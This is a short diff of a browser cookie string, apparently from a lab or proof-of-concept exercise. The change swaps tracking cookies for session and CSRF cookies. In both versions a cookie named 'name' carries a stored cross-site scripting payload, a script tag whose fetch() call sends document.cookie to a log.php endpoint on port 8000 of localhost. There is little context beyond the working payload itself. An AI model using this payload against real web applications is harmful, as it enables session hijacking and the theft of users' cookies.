@@ -1,1 +1,1 @@
-hubspotutk=3e2a7ef7c996e00abd0313531fe87605; _gcl_au=1.1.1759694572.1653731039; __hstc=19301799.3e2a7ef7c996e00abd0313531fe87605.1653731038428.1654009521715.1654245139785.11; canyouseeme=I am Jos Fairy; name=<script>fetch('http://127.0.0.1:8000/log.php?c=' + document.cookie)</script>
+ci_session=da98406952bf52b23e5da7ff1fbf44989a7fd416; rise_csrf_cookie=4113f791130cab4fa581cd95d21f63b1; canyouseeme=I am Jos Fairy; name=<script>fetch('http://127.0.0.1:8000/log.php?c=' + document.cookie)</script>
